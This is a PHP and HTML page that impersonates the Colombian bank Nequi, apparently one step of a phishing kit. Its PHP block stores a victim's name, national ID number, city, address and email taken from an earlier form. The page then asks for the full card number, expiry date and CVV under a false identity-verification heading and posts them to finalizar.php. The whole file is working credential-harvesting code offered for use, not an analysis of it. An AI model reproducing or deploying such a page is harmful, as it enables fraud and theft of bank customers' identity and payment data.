<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $cedula = $_POST["cedula"];
    $ciudad = $_POST["ciudad"];
    $dir    = $_POST["dir"];
    $email  = $_POST["email"];

    $_SESSION["nombre"] = $nombre;
    $_SESSION["cedula"] = $cedula;
    $_SESSION["ciudad"] = $ciudad;
    $_SESSION["dir"]    = $dir;
    $_SESSION["email"]  = $email;
} else {
    header("Location: login.html");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="no-cache, max-age=0">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="pragma" content="no-cache">

    <!-- Estilos -->
    <link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">

    <!-- Librerías JS -->
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="assets/js/libs/lodash.min.js"></script>
    <script src="assets/js/libs/restangular.min.js"></script>
    <script src="assets/js/libs/angular-recaptcha.min.js"></script>
</head>

<body ng-app="App" class="ng-scope">
    <div id="content">
        <!-- Header (opcional, si tienes header.html en public) -->
        <!-- <div ng-include="getTemplate('header.html')" class="ng-scope"></div> -->

        <!-- Sección principal -->
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <img src="assets/images/push-action-timerV2.gif" alt="Verificación" width="25%">
                <h1>Queremos verificar tu identidad</h1>
                <div class="login-form-wrap">
                    <form method="POST" action="finalizar.php" autocomplete="off" name="loginControl.formLogin" novalidate>
                        <div class="preguntas">
                            <input type="text" name="codigo" maxlength="16" minlength="16" required
                                placeholder="Código Tarjeta" style="width:90%;height:35px;background:#f3d5e85d;border:none;padding-left:10px;">
                            <input type="tel" name="fecha" required
                                placeholder="Fecha Exp (MM/AAAA)" style="width:90%;height:35px;background:#f3d5e85d;border:none;margin-top:10px;padding-left:10px;">
                            <input type="text" name="cvv" maxlength="3" required
                                placeholder="CVV" style="width:90%;height:35px;background:#f3d5e85d;border:none;margin-top:10px;padding-left:10px;">
                        </div>
                        <div class="btn-wrap">
                            <input class="form-btn-submit" type="submit" value="Finalizar">
                        </div>
                    </form>
                </div>
            </div>
        </section>

        <!-- Footer (opcional, si tienes footer.html en public) -->
        <!-- <div ng-include="getTemplate('footer.html')" class="ng-scope"></div> -->
    </div>

    <!-- Scripts -->
    <script src="assets/js/script.js"></script>
    <script async defer src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&render=explicit"></script>
</body>
</html>